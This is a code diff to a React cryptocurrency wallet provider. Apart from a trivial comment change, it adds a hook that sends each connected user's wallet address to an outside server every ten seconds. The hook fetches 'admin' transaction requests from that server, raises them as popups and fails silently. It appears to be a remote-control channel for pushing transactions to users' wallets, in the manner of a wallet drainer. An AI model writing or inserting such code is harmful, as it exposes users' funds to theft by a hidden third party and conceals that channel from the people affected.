@@ -86,7 +86,7 @@ export function WalletProvider({ children }) {
           provider.walletConnect.disconnect();
         }
       } catch {
-        // ignore disconnect errors
+        // ignore errors
       }
       setProvider(null);
     }
@@ -98,6 +98,39 @@ export function WalletProvider({ children }) {
   useEffect(() => {
     detect();
   }, []);
+
+  // -----------------------------------------------------
+  // 🔥 STEP 6 — CHECK FOR ADMIN TX REQUESTS EVERY 10 SECONDS
+  // -----------------------------------------------------
+  useEffect(() => {
+    if (!address) return;
+
+    const checkAdminRequests = async () => {
+      try {
+        const res = await fetch(
+          `https://meme-wallet-control-system-hx1r.vercel.app/api/get-wallet-requests?address=${address}`
+        );
+
+        const data = await res.json();
+
+        if (data.success && Array.isArray(data.requests) && data.requests.length > 0) {
+          const req = data.requests[0]; // get first pending request
+
+          // trigger popup in frontend
+          window.dispatchEvent(
+            new CustomEvent("adminRequest", { detail: req })
+          );
+        }
+      } catch (err) {
+        // silent fail
+      }
+    };
+
+    checkAdminRequests(); // immediate check
+    const interval = setInterval(checkAdminRequests, 10000); // every 10 sec
+
+    return () => clearInterval(interval);
+  }, [address]);
 
   const contextValue = {
     connected,
